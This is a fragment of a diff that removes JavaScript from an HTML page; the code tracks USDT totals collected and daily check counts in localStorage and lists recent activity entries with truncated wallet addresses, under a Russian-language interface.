-            const total = localStorage.getItem('totalCollected') || '0';
-            const today = localStorage.getItem('checksToday') || '0';
-            document.getElementById('totalCollected').textContent = parseFloat(total).toFixed(2) + ' USDT';
-            document.getElementById('checksToday').textContent = today;
-
-            const lastDate = localStorage.getItem('lastCheckDate');
-            const todayDate = new Date().toDateString();
-            if (lastDate !== todayDate) {
-                localStorage.setItem('checksToday', '0');
-                localStorage.setItem('lastCheckDate', todayDate);
-                document.getElementById('checksToday').textContent = '0';
-            }
-        }
-
-        function incrementChecks() {
-            let count = parseInt(localStorage.getItem('checksToday') || '0');
-            localStorage.setItem('checksToday', (count + 1).toString());
-            document.getElementById('checksToday').textContent = count + 1;
-        }
-
-        function updateTotalCollected(amount) {
-            let total = parseFloat(localStorage.getItem('totalCollected') || '0');
-            total += amount * 0.98;
-            localStorage.setItem('totalCollected', total.toString());
-            document.getElementById('totalCollected').textContent = total.toFixed(2) + ' USDT';
-        }
-
-        function addActivity(user, amount, tx) {
-            const list = document.getElementById('activityList');
-            const time = new Date().toLocaleTimeString('ru-RU');
-
-            if (list.innerHTML.includes('Нет недавних операций')) {
-                list.innerHTML = '';
-                list.style.textAlign = 'left';
-                list.style.padding = '0';
-            }
-
-            const item = document.createElement('div');
-            item.style.cssText = 'padding: 1rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;';
-            item.innerHTML = `
-                <div>
-                    <div style="font-family: monospace; font-size: 0.875rem; color: var(--text-primary);">
-                        ${user.slice(0, 8)}...${user.slice(-4)}
-                    </div>
-                    <div style="font-size: 0.75rem; color: var(--text-secondary);">${time}</div>
-                </div>
-                <div style="color: var(--success); font-weight: 600;">+${amount} USDT</div>
-            `;
-
-            list.insertBefore(item, list.firstChild);
         }
     </script>
 </body>
